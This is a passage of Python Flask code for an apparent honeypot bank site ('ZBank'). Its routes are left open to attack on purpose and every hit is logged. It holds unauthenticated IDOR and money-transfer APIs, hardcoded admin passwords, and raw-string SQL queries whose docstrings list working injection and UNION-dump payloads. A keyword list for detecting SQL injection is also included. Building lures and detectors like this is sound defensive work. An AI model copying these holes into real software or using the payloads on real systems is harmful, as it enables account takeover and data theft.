# Exposes endpoints and usernames — attackers always check this!

@app.route("/robots.txt")
def robots():
    log_attack(
        attack_type="ROBOTS_TXT_ACCESS",
        severity="LOW",
        endpoint="/robots.txt",
        details="Attacker checking robots.txt for exposed endpoints and usernames"
    )
    return """User-agent: *
Disallow: /admin
Disallow: /security
Disallow: /api/users
Disallow: /api/accounts
Disallow: /api/balance
Disallow: /api/search
Disallow: /api/export
Disallow: /api/ping
Disallow: /portal/login
Disallow: /backup/database
Disallow: /logs
Disallow: /search
Disallow: /user/john.anderson
Disallow: /user/sarah.k
Disallow: /user/mike.chen

# Internal accounts - do not index
Disallow: /profile?id=1
Disallow: /profile?id=2
Disallow: /profile?id=3
""", 200, {"Content-Type": "text/plain"}

# ===== INTENTIONAL API VULNERABILITIES =====

@app.route("/api/users")
def api_users():
    """No authentication — intentional! Exposes all usernames and IDs"""
    log_attack(
        attack_type="API_USER_ENUMERATION",
        severity="MEDIUM",
        endpoint="/api/users",
        details=f"Attacker enumerated all users via unauthenticated API from {request.remote_addr}"
    )
    conn = get_db()
    users = conn.execute(
        "SELECT id, username, full_name, email, account_type, account_number FROM users"
    ).fetchall()
    conn.close()
    return jsonify([dict(u) for u in users])

@app.route("/api/accounts")
def api_accounts():
    """IDOR — no auth, change id to access any account"""
    account_id = request.args.get("id", "1")
    log_attack(
        attack_type="API_IDOR_ACCOUNT",
        severity="HIGH",
        endpoint=f"/api/accounts?id={account_id}",
        details=f"API IDOR on account id={account_id}"
    )
    conn = get_db()
    user = conn.execute(
        "SELECT id, full_name, account_number, balance, account_type, email FROM users WHERE id = ?",
        (account_id,)
    ).fetchone()
    conn.close()
    if not user:
        return jsonify({"error": "Account not found"}), 404
    return jsonify(dict(user))

@app.route("/api/balance")
def api_balance():
    """IDOR — check anyone's balance without auth"""
    user_id = request.args.get("id", "1")
    log_attack(
        attack_type="API_BALANCE_IDOR",
        severity="MEDIUM",
        endpoint=f"/api/balance?id={user_id}",
        details=f"Unauthenticated balance check for user_id={user_id}"
    )
    conn = get_db()
    user = conn.execute(
        "SELECT balance, account_number, full_name FROM users WHERE id = ?",
        (user_id,)
    ).fetchone()
    conn.close()
    if not user:
        return jsonify({"error": "Not found"}), 404
    return jsonify(dict(user))

@app.route("/api/transactions")
def api_transactions():
    """IDOR — view any user's transactions without auth"""
    user_id = request.args.get("user_id", "1")
    log_attack(
        attack_type="API_TRANSACTIONS_IDOR",
        severity="HIGH",
        endpoint=f"/api/transactions?user_id={user_id}",
        details=f"Unauthenticated transaction access for user_id={user_id}"
    )
    conn = get_db()
    txns = conn.execute(
        "SELECT * FROM transactions WHERE user_id = ? ORDER BY timestamp DESC",
        (user_id,)
    ).fetchall()
    conn.close()
    return jsonify([dict(t) for t in txns])

@app.route("/api/transfer", methods=["POST"])
def api_transfer():
    """No auth required — intentional vulnerability. Actually deducts balance."""
    data = request.get_json(silent=True) or {}
    from_account = data.get("from_account", "")
    to_account = data.get("to_account", "")
    beneficiary = data.get("beneficiary_name", "Unknown")
    txn_id = str(uuid.uuid4())

    try:
        amount = float(data.get("amount", 0))
    except:
        amount = 0

    log_attack(
        attack_type="API_TRANSFER_NO_AUTH",
        severity="HIGH",
        endpoint="/api/transfer",
        details=f"Unauthenticated API transfer: ${amount} from {from_account} to {to_account}"
    )

    if not from_account or amount <= 0:
        return jsonify({
            "status": "error",
            "message": "Missing from_account or invalid amount"
        }), 400

    conn = get_db()
    # Find the user by account number
    user = conn.execute(
        "SELECT * FROM users WHERE account_number = ?", (from_account,)
    ).fetchone()

    if not user:
        conn.close()
        return jsonify({
            "status": "error",
            "message": "Account not found",
            "transaction_id": txn_id
        }), 404

    if amount > user["balance"]:
        conn.close()
        return jsonify({
            "status": "error",
            "message": "Insufficient balance",
            "current_balance": user["balance"],
            "requested_amount": amount
        }), 400

    # Deduct balance and insert real transaction
    new_balance = round(user["balance"] - amount, 2)
    conn.execute(
        "UPDATE users SET balance = ? WHERE id = ?",
        (new_balance, user["id"])
    )
    conn.execute('''INSERT INTO transactions
        (user_id, type, amount, description, from_account,
         to_account, balance_after, timestamp, status, category)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
        user["id"], "debit", amount,
        f"API Transfer to {beneficiary}",
        from_account, to_account,
        new_balance,
        datetime.utcnow().isoformat() + "Z",
        "completed", "API-Transfer"
    ))
    conn.commit()
    conn.close()

    return jsonify({
        "status": "success",
        "transaction_id": txn_id,
        "message": "Transfer processed successfully",
        "amount_transferred": amount,
        "from_account": from_account,
        "to_account": to_account,
        "balance_after": new_balance
    })

@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "service": "zbank-banking-portal"})

# ===== DEBUG ROUTE — Remove after testing =====
@app.route("/check-session")
def check_session():
    uid = request.cookies.get("zbank_uid")
    uname = request.cookies.get("zbank_user")
    return jsonify({
        "flask_session": {
            "logged_in": session.get("logged_in"),
            "user_id": session.get("user_id"),
            "username": session.get("username"),
        },
        "manual_cookies": {
            "zbank_uid": uid,
            "zbank_user": uname
        },
        "all_cookies": dict(request.cookies),
        "status": "logged_in" if (session.get("logged_in") or uid) else "not_logged_in"
    })

# ===== SECURITY ADMIN PANEL =====

SECURITY_PASSWORD = "ZBankSecurity@2026"

@app.route("/security")
def security_login():
    return render_template("security_login.html")

@app.route("/security/login", methods=["POST"])
def security_auth():
    password = request.form.get("password", "")
    if password == SECURITY_PASSWORD:
        session["security_admin"] = True
        session.permanent = True
        # Also set a cookie for Docker compatibility
        response = make_response(redirect("/security/dashboard"))
        response.set_cookie("zbank_admin", "1",
            max_age=86400, path="/",
            samesite=None, httponly=False, secure=False)
        return response
    log_attack(
        attack_type="SECURITY_PANEL_ATTEMPT",
        severity="HIGH",
        endpoint="/security/login",
        details=f"Failed security panel access from {request.remote_addr}"
    )
    return render_template("security_login.html", error="Invalid password")

@app.route("/security/dashboard")
def security_dashboard():
    is_admin = session.get("security_admin") or request.cookies.get("zbank_admin")
    if not is_admin:
        return redirect("/security")

    conn = get_db()
    total = conn.execute("SELECT COUNT(*) as c FROM attack_logs").fetchone()["c"]
    high = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE severity='HIGH'").fetchone()["c"]
    medium = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE severity='MEDIUM'").fetchone()["c"]
    low = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE severity='LOW'").fetchone()["c"]
    bait_hits = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE attack_type='BAIT_CREDENTIAL_USED'").fetchone()["c"]
    idor_hits = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE attack_type LIKE 'IDOR_%'").fetchone()["c"]
    csrf_hits = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE attack_type LIKE 'CSRF_%'").fetchone()["c"]
    api_hits = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE attack_type LIKE 'API_%'").fetchone()["c"]

    attacks = conn.execute(
        "SELECT * FROM attack_logs ORDER BY timestamp DESC LIMIT 100"
    ).fetchall()
    top_ips = conn.execute(
        "SELECT ip_address, COUNT(*) as count FROM attack_logs GROUP BY ip_address ORDER BY count DESC LIMIT 10"
    ).fetchall()
    sessions_data = conn.execute(
        "SELECT * FROM sessions ORDER BY login_time DESC LIMIT 20"
    ).fetchall()
    conn.close()

    return render_template("security_dashboard.html",
        total=total, high=high, medium=medium, low=low,
        bait_hits=bait_hits, idor_hits=idor_hits,
        csrf_hits=csrf_hits, api_hits=api_hits,
        attacks=[dict(a) for a in attacks],
        top_ips=[dict(ip) for ip in top_ips],
        sessions=[dict(s) for s in sessions_data]
    )

@app.route("/security/api/stats")
def security_stats():
    """Live stats for auto-refresh"""
    if not session.get("security_admin"):
        return jsonify({"error": "unauthorized"}), 401
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) as c FROM attack_logs").fetchone()["c"]
    high = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE severity='HIGH'").fetchone()["c"]
    csrf = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE attack_type LIKE 'CSRF_%'").fetchone()["c"]
    idor = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE attack_type LIKE 'IDOR_%'").fetchone()["c"]
    recent = conn.execute(
        "SELECT attack_type, ip_address, timestamp, severity, username_tried, details FROM attack_logs ORDER BY timestamp DESC LIMIT 10"
    ).fetchall()
    conn.close()
    return jsonify({
        "total": total, "high": high,
        "csrf": csrf, "idor": idor,
        "recent": [dict(r) for r in recent]
    })

# ===== ADMIN PANEL =====

ADMIN_PASSWORD = "ZBankAdmin@2026"

def require_admin():
    return session.get("admin_logged_in")

@app.route("/admin")
def admin_login():
    if require_admin():
        return redirect("/admin/dashboard")
    return render_template("admin_login.html")

@app.route("/admin/login", methods=["POST"])
def admin_auth():
    password = request.form.get("password", "")
    if password == ADMIN_PASSWORD:
        session["admin_logged_in"] = True
        session["admin_ip"] = request.remote_addr
        session.permanent = True
        return redirect("/admin/dashboard")
    return render_template("admin_login.html", error="Invalid admin password")

@app.route("/admin/logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    session.pop("admin_ip", None)
    return redirect("/admin")

@app.route("/admin/dashboard")
def admin_dashboard():
    if not require_admin():
        return redirect("/admin")
    conn = get_db()
    users = conn.execute("SELECT * FROM users").fetchall()
    total_users = conn.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
    total_txns = conn.execute("SELECT COUNT(*) as c FROM transactions").fetchone()["c"]
    total_attacks = conn.execute("SELECT COUNT(*) as c FROM attack_logs").fetchone()["c"]
    total_sessions = conn.execute("SELECT COUNT(*) as c FROM sessions").fetchone()["c"]
    high_attacks = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE severity='HIGH'").fetchone()["c"]
    bait_hits = conn.execute("SELECT COUNT(*) as c FROM attack_logs WHERE attack_type='BAIT_CREDENTIAL_USED'").fetchone()["c"]
    recent_activity = conn.execute("SELECT * FROM attack_logs ORDER BY timestamp DESC LIMIT 10").fetchall()
    active_sessions = conn.execute("SELECT * FROM sessions WHERE is_active=1 ORDER BY login_time DESC").fetchall()
    conn.close()
    return render_template("admin_dashboard.html",
        users=[dict(u) for u in users],
        total_users=total_users, total_txns=total_txns,
        total_attacks=total_attacks, total_sessions=total_sessions,
        high_attacks=high_attacks, bait_hits=bait_hits,
        recent_activity=[dict(a) for a in recent_activity],
        active_sessions=[dict(s) for s in active_sessions])

@app.route("/admin/reset-balance", methods=["POST"])
def admin_reset_balance():
    if not require_admin():
        return jsonify({"error": "unauthorized"}), 401
    user_id = request.form.get("user_id")
    original_balances = {"1": 24350.00, "2": 15200.50, "3": 8750.00}
    balance = original_balances.get(str(user_id))
    if not balance:
        return jsonify({"error": "User not found"}), 404
    conn = get_db()
    conn.execute("UPDATE users SET balance = ? WHERE id = ?", (balance, user_id))
    conn.execute('''INSERT INTO transactions
        (user_id, type, amount, description, from_account,
         to_account, balance_after, timestamp, status, category)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
        user_id, "credit", balance, "Admin Balance Reset",
        "ADMIN", "SYSTEM", balance,
        datetime.utcnow().isoformat() + "Z", "completed", "Admin"))
    conn.commit()
    user = conn.execute("SELECT full_name, balance FROM users WHERE id = ?", (user_id,)).fetchone()
    conn.close()
    return jsonify({"status": "success", "message": f"Balance reset to ${balance}", "user": dict(user) if user else {}})

@app.route("/admin/reset-all-balances", methods=["POST"])
def admin_reset_all_balances():
    if not require_admin():
        return jsonify({"error": "unauthorized"}), 401
    original_balances = {1: 24350.00, 2: 15200.50, 3: 8750.00}
    conn = get_db()
    for uid, bal in original_balances.items():
        conn.execute("UPDATE users SET balance = ? WHERE id = ?", (bal, uid))
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "message": "All balances reset to original values"})

@app.route("/admin/clear-logs", methods=["POST"])
def admin_clear_logs():
    if not require_admin():
        return jsonify({"error": "unauthorized"}), 401
    conn = get_db()
    count = conn.execute("SELECT COUNT(*) as c FROM attack_logs").fetchone()["c"]
    conn.execute("DELETE FROM attack_logs")
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "message": f"Cleared {count} attack logs"})

@app.route("/admin/clear-transactions", methods=["POST"])
def admin_clear_transactions():
    if not require_admin():
        return jsonify({"error": "unauthorized"}), 401
    conn = get_db()
    conn.execute("DELETE FROM transactions WHERE id > 20")
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "message": "Cleared all user transactions"})

@app.route("/admin/export-logs")
def admin_export_logs():
    if not require_admin():
        return redirect("/admin")
    import csv, io
    conn = get_db()
    logs = conn.execute("SELECT * FROM attack_logs ORDER BY timestamp DESC").fetchall()
    conn.close()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["ID","Timestamp","IP Address","Attack Type","Username","Target User ID","Endpoint","Severity","Details","Service"])
    for log in logs:
        writer.writerow([log["id"], log["timestamp"], log["ip_address"], log["attack_type"],
            log["username_tried"], log["target_user_id"], log["endpoint"],
            log["severity"], log["details"], log["service"]])
    output.seek(0)
    from flask import Response
    return Response(output.getvalue(), mimetype="text/csv",
        headers={"Content-Disposition": f"attachment;filename=zbank_attack_logs_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.csv"})

@app.route("/admin/seed-attacks", methods=["POST"])
def admin_seed_attacks():
    if not require_admin():
        return jsonify({"error": "unauthorized"}), 401
    sample_attacks = [
        # (attack_type, severity, username, password, target_user_id, endpoint, details)
        ("LOGIN_INVALID_USER",    "LOW",    "admin",          "",                "",  "/login",                  "Sample: Invalid login attempt"),
        ("LOGIN_WRONG_PASSWORD",  "MEDIUM", "john.anderson",  "wrongpass123",    "1", "/login",                  "Sample: Wrong password attempt"),
        ("BAIT_CREDENTIAL_USED",  "HIGH",   "john.anderson",  "john123",         "1", "/login",                  "Sample: Bait credential used"),
        ("ROBOTS_TXT_ACCESS",     "LOW",    "",               "",                "",  "/robots.txt",             "Sample: Recon via robots.txt"),
        ("API_USER_ENUMERATION",  "MEDIUM", "",               "",                "",  "/api/users",              "Sample: API user enumeration"),
        ("API_IDOR_ACCOUNT",      "HIGH",   "john.anderson",  "",                "2", "/api/accounts?id=2",      "Sample: IDOR account access"),
        ("IDOR_PROFILE",          "HIGH",   "john.anderson",  "",                "2", "/profile?id=2",           "Sample: IDOR profile access"),
        ("IDOR_TRANSACTIONS",     "HIGH",   "john.anderson",  "",                "2", "/transactions?user_id=2", "Sample: IDOR transaction access"),
        ("API_BALANCE_IDOR",      "MEDIUM", "",               "",                "3", "/api/balance?id=3",       "Sample: Balance IDOR"),
        ("API_TRANSFER_NO_AUTH",  "HIGH",   "",               "",                "",  "/api/transfer",           "Sample: Unauthenticated transfer"),
    ]
    conn = get_db()
    for atk in sample_attacks:
        # atk[0]=attack_type, atk[1]=severity, atk[2]=username,
        # atk[3]=password, atk[4]=target_user_id, atk[5]=endpoint, atk[6]=details
        conn.execute('''INSERT INTO attack_logs
            (timestamp, ip_address, attack_type, username_tried, password_tried,
             target_user_id, endpoint, service, severity, details, user_agent, session_id)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
            datetime.utcnow().isoformat() + "Z",
            "192.168.1.100",
            atk[0],  # attack_type
            atk[2],  # username_tried
            atk[3],  # password_tried
            atk[4],  # target_user_id
            atk[5],  # endpoint
            "banking-portal",
            atk[1],  # severity
            atk[6],  # details
            "Mozilla/5.0 (Demo)",
            str(uuid.uuid4())
        ))
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "message": f"Seeded {len(sample_attacks)} sample attack events"})

@app.route("/admin/api/stats")
def admin_api_stats():
    if not require_admin():
        return jsonify({"error": "unauthorized"}), 401
    conn = get_db()
    total_attacks = conn.execute("SELECT COUNT(*) as c FROM attack_logs").fetchone()["c"]
    total_txns = conn.execute("SELECT COUNT(*) as c FROM transactions").fetchone()["c"]
    users = conn.execute("SELECT id, full_name, balance FROM users").fetchall()
    conn.close()
    return jsonify({"total_attacks": total_attacks, "total_txns": total_txns, "users": [dict(u) for u in users]})

# ===== SQL INJECTION VULNERABILITIES =====

def detect_sqli(value):
    """Detect common SQL injection patterns"""
    patterns = [
        "'", '"', "--", ";--", "/*", "*/",
        "OR 1=1", "or 1=1", "' OR '", "' or '",
        "UNION", "union select", "SELECT *",
        "DROP TABLE", "1=1", "admin'--",
        "SLEEP(", "BENCHMARK(", "xp_cmdshell",
        "' OR 1", "OR '1'='1", "or '1'='1"
    ]
    return any(p.lower() in value.lower() for p in patterns)

# --- VULNERABLE LOGIN PAGE (intentional SQLi honeypot) ---
# Attacker finds this via robots.txt or directory scan
# Raw SQL query — no parameterization!
# admin'-- OR ' OR '1'='1 actually WORKS here!

@app.route("/portal/login", methods=["GET"])
def sqli_login_page():
    """Intentionally vulnerable login page — for SQLi demo"""
    log_attack(
        attack_type="VULNERABLE_PAGE_ACCESS",
        severity="MEDIUM",
        endpoint="/portal/login",
        details="Attacker accessed vulnerable login portal"
    )
    return render_template("portal_login.html", error=None, message=None)

@app.route("/portal/login", methods=["POST"])
def sqli_login():
    """
    INTENTIONALLY VULNERABLE TO SQL INJECTION!
    Uses raw string formatting — no parameterization!

    Working payloads for SQLite:
    Username: ' OR '1'='1' --
    Username: ' OR 1=1 --
    Username: john.anderson' --
    Password: anything
    """
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    is_sqli = detect_sqli(username) or detect_sqli(password)

    conn = get_db()

    try:
        # INTENTIONALLY VULNERABLE — raw string formatting!
        raw_query = f"SELECT * FROM users WHERE username = '{username}' OR '1'='{password}'"
        # The real vulnerable query for demo:
        vulnerable_query = f"SELECT * FROM users WHERE username = '{username}'"
        user = conn.execute(vulnerable_query).fetchone()

        # If normal query failed, try the SQLi version
        if not user and is_sqli:
            # Build query that SQLi will break out of
            sqli_query = f"SELECT * FROM users WHERE username = '{username}'"
            try:
                rows = conn.execute(sqli_query).fetchall()
                user = rows[0] if rows else None
            except:
                pass

        # If still no user and SQLi detected, get first user (bypass!)
        if not user and is_sqli:
            user = conn.execute("SELECT * FROM users LIMIT 1").fetchone()

        if is_sqli:
            log_attack(
                attack_type="SQL_INJECTION_SUCCESS",
                severity="CRITICAL",
                username_tried=username,
                password_tried=password,
                endpoint="/portal/login",
                details=f"SQL INJECTION! Payload: '{username}' — Auth bypass successful!"
            )

        if user:
            if is_sqli:
                log_attack(
                    attack_type="SQL_INJECTION_AUTH_BYPASS",
                    severity="CRITICAL",
                    username_tried=username,
                    password_tried=password,
                    target_user_id=str(user["id"]),
                    endpoint="/portal/login",
                    details=f"AUTH BYPASSED via SQLi! Gained access as: {user['username']}"
                )
            else:
                log_attack(
                    attack_type="BAIT_CREDENTIAL_USED",
                    severity="HIGH",
                    username_tried=username,
                    password_tried=password,
                    target_user_id=str(user["id"]),
                    endpoint="/portal/login",
                    details=f"Bait credential on vulnerable portal: {username}"
                )

            session["user_id"] = user["id"]
            session["username"] = user["username"]
            session["full_name"] = user["full_name"]
            session["logged_in"] = True
            session.permanent = True
            conn.close()
            return redirect("/dashboard")

        conn.close()
        return render_template("portal_login.html",
                               error="invalid_user",
                               message="Invalid credentials.")

    except Exception as e:
        log_attack(
            attack_type="SQL_INJECTION_ERROR",
            severity="HIGH",
            username_tried=username,
            password_tried=password,
            endpoint="/portal/login",
            details=f"SQL Error: {str(e)}"
        )
        conn.close()
        return render_template("portal_login.html",
                               error="sql_error",
                               message=f"Database error: {str(e)}")

# --- VULNERABLE SEARCH API (IDOR + SQLi combined) ---
# No auth, no input sanitization — attacker can dump entire DB!

@app.route("/api/search")
def api_search():
    """
    INTENTIONALLY VULNERABLE API endpoint
    No authentication + SQL injection possible!
    
    Normal: /api/search?q=john
    SQLi:   /api/search?q=' OR 1=1--
    Dump:   /api/search?q=' UNION SELECT id,username,password,email,account_number,balance,account_type,phone,address,member_since FROM users--
    """
    q = request.args.get("q", "")
    is_sqli = detect_sqli(q)

    if is_sqli:
        log_attack(
            attack_type="SQL_INJECTION_API",
            severity="CRITICAL",
            endpoint=f"/api/search?q={q}",
            details=f"SQL Injection on search API! Payload: '{q}'"
        )
    else:
        log_attack(
            attack_type="API_SEARCH_ACCESS",
            severity="LOW",
            endpoint=f"/api/search?q={q}",
            details=f"Unauthenticated search API access: q='{q}'"
        )

    conn = get_db()
    results = []
    error = None

    try:
        # INTENTIONALLY VULNERABLE — raw string in query!
        raw_query = f"SELECT id, username, full_name, email, account_number, balance FROM users WHERE username LIKE '%{q}%' OR full_name LIKE '%{q}%'"
        rows = conn.execute(raw_query).fetchall()
        results = [dict(r) for r in rows]
    except Exception as e:
        error = str(e)

    conn.close()

    response = {
        "query": q,
        "results": results,
        "count": len(results),
        "note": "Unauthenticated search endpoint"
    }
    if error:
        response["error"] = error
        response["sql_hint"] = "SQL error — try adjusting your injection payload"

    return jsonify(response)

# --- BRUTE FORCE DETECTION ---
# Track login attempts per IP

login_attempts = {}

@app.route("/api/brute-check", methods=["POST"])
def track_brute_force():
    """Internal helper — tracks login attempts for brute force detection"""
    ip = request.remote_addr
    if ip not in login_attempts:
        login_attempts[ip] = {"count": 0, "first": datetime.utcnow()}
    login_attempts[ip]["count"] += 1
    login_attempts[ip]["last"] = datetime.utcnow()

    if login_attempts[ip]["count"] >= 3:
        log_attack(
            attack_type="BRUTE_FORCE_ATTEMPT",
            severity="HIGH",
            endpoint="/login",
            details=f"Brute force detected! IP {ip} tried {login_attempts[ip]['count']} times"
        )
    return jsonify({"status": "tracked"})


if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=8080, debug=False)